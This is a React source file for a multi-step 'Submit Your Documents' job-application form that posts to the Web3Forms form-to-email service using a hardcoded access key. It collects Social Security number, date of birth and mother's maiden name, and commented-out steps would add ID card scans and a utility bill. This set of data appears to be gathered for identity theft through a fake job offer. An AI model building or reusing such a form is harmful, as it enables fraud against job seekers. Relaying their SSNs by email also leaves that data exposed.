import React, { useState } from 'react';
import { HiXMark } from "react-icons/hi2";
import { useNavigate } from 'react-router-dom';
import Step1 from '../components/FormInput/Step1';
import Step2 from '../components/FormInput/Step2';
import Step3 from '../components/FormInput/Step3';

const Form = () => {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    mothersMaidenName: '',
    address1: '',
    email: '',
    positionApplied: '',
    ssn: '',
    startDate: '',
    telephone: '',
    dob: '',
    /* idCardFront: null,
    idCardBack: null,
    utilityBill: null, */
  });

  const [errors, setErrors] = useState({});
  const [result, setResult] = useState(''); // Add this to hold submission result

  const validateStep = () => {
    const newErrors = {};
    switch (currentStep) {
      case 1:
        if (!formData.lastName) newErrors.lastName = 'Last Name is required';
        if (!formData.firstName) newErrors.firstName = 'First Name is required';
        if (!formData.mothersMaidenName) newErrors.mothersMaidenName = 'Mother\'s Maiden Name is required';
        if (!formData.address1) newErrors.address1 = 'Address Line 1 is required';
        break;
      case 2:
        if (!formData.email) newErrors.email = 'Email is required';
        else if (!/\S+@\S+\.\S+/.test(formData.email)) newErrors.email = 'Email is invalid';
        if (!formData.positionApplied) newErrors.positionApplied = 'Position Applied is required';
        if (!formData.ssn) newErrors.ssn = 'SSN is required';
        if (!formData.dob) newErrors.dob = 'Dob is required';
        break;
      case 3:
        if (!formData.startDate) newErrors.startDate = 'Start Date is required';
        if (!formData.telephone) newErrors.telephone = 'Telephone is required';
        break;
     /*  case 4:
        if (!formData.idCardBack) newErrors.idCardBack = 'ID Card Back is required';
        if (!formData.utilityBill) newErrors.utilityBill = 'Utility Bill is required';
        break;
      default:
        break; */
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = () => {
    if (validateStep()) {
      setCurrentStep((prevStep) => prevStep + 1);
    }
  };

  const handlePrevious = () => {
    setCurrentStep((prevStep) => prevStep - 1);
  };

  const handleChange = (e) => {
    const { name, type, value, files } = e.target;
    if (type === 'file') {
      setFormData((prevState) => ({
        ...prevState,
        [name]: files[0] || null,
      }));
    } else {
      setFormData((prevState) => ({
        ...prevState,
        [name]: value,
      }));
    }
  };

  const onSubmit = async (event) => {
    event.preventDefault();

    setResult("Sending...");

    // Create a new FormData object
    const formDataObj = new FormData();

    // Append form data from state to FormData object
    for (const key in formData) {
      if (formData[key] !== null) {
        formDataObj.append(key, formData[key]);
      }
    }

    // Append the Web3Forms access key
    formDataObj.append("access_key", "2ca25c93-6975-46f5-a54d-9f43358d6f3f");

    try {
      // Submit the form data to Web3Forms
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formDataObj,
      });

      const data = await response.json();

      if (data.success) {
        setResult("Form Submitted Successfully");
        setFormData({
          lastName: '',
          firstName: '',
          mothersMaidenName: '',
          address1: '',
          email: '',
          positionApplied: '',
          ssn: '',
          startDate: '',
          telephone: '',
          dob: '',
        });
        setCurrentStep(1);
        navigate('/');
      } else {
        console.error("Error:", data);
        setResult(data.message || "Form submission failed");
      }
    } catch (error) {
      console.error("Error during form submission:", error);
      setResult("An unexpected error occurred. Please try again.");
    }
  };

  return (
    <div className='max-w-4xl mx-auto w-full h-full p-10 bg-transparent rounded-lg shadow-md'>
      <div className='inline-flex gap-10'>
        <h2 className='text-2xl font-bold mb-10 text-white'>Submit Your Documents</h2>
        <HiXMark
          onClick={() => navigate('/')}
          size={40}
          className='cursor-pointer text-white p-3 bg-purple-600 rounded-3xl'
        />
      </div>

      <form onSubmit={onSubmit}>
        {currentStep === 1 && (
          <Step1 formData={formData} errors={errors} handleChange={handleChange} />
        )}

        {currentStep === 2 && (
          <Step2 formData={formData} errors={errors} handleChange={handleChange} />
        )}

        {currentStep === 3 && (
          <Step3 formData={formData} errors={errors} handleChange={handleChange} />
        )}

     {/*    {currentStep === 4 && (
          <Step4 formData={formData} errors={errors} handleChange={handleChange} />
        )} */}

        <div className='flex justify-between mt-10'>
          {currentStep > 1 && (
            <button
              type='button'
              onClick={handlePrevious}
              className='bg-gray-600 text-white px-4 py-2 rounded-lg'
            >
              Previous
            </button>
          )}
          {currentStep < 3 && (
            <button
              type='button'
              onClick={handleNext}
              className='bg-blue-500 text-white px-4 py-2 rounded-lg'
            >
              Next
            </button>
          )}
          {currentStep === 3 && (
            <button
              type='submit'
              className='bg-green-500 text-white px-4 py-2 rounded-lg'
            >
              Submit
            </button>
          )}
        </div>
      </form>

      {result && <p className='mt-4 text-white'>{result}</p>} {/* Display result */}
    </div>
  );
};

export default Form;
